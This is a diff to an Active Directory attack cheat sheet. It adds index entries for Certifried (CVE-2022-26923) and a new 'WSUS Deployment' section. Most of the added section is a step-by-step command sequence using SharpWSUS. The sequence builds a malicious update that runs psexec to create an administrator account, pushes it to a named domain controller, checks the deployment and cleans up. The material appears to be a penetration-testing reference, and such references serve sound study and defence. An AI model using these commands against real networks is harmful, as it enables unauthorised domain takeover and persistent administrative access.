@@ -81,6 +81,7 @@
       - [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 ](#esc6---editf_attributesubjectaltname2)
       - [ESC7 - Vulnerable Certificate Authority Access Control](#esc7---vulnerable-certificate-authority-access-control)
       - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
+      - [Certifried CVE-2022-26923](#certifried-cve-2022-26923)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
       - [GenericAll](#genericall)
@@ -106,6 +107,7 @@
     - [Kerberos Bronze Bit Attack - CVE-2020-17049](#kerberos-bronze-bit-attack---cve-2020-17049)
     - [PrivExchange attack](#privexchange-attack)
     - [SCCM Deployment](#sccm-deployment)
+    - [WSUS Deployment](#wsus-deployment)
     - [RODC - Read Only Domain Controller Compromise](#rodc---read-only-domain-controller-compromise)
     - [PXE Boot image attack](#pxe-boot-image-attack)
     - [DSRM Credentials](#dsrm-credentials)
@@ -2458,7 +2460,7 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
 
 > An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.
 
-* Find ms-DS-MachineAccountQuota
+* Find `ms-DS-MachineAccountQuota`
   ```ps1
   python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes  'DC=lab,DC=local' ms-DS-MachineAccountQuota 
   ```
@@ -3334,7 +3336,20 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
     MalSCCM.exe group /delete /groupname:TargetGroup
     ```
 
+### WSUS Deployment
 
+> Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network
+
+:warning: The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary.
+
+* [SharpWSUS](https://github.com/nettitude/SharpWSUS)
+
+1. Locate using `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate` or `SharpWSUS.exe locate`
+2. After WSUS Server compromise: `SharpWSUS.exe inspect`
+3. Create a malicious patch: `SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add && net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"`
+4. Deploy it on the target: `SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:"Demo Group"`
+5. Check status deployment: `SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local`
+6. Clean up: `SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:”Demo Group`
 
 ### RODC - Read Only Domain Controller Compromise
 
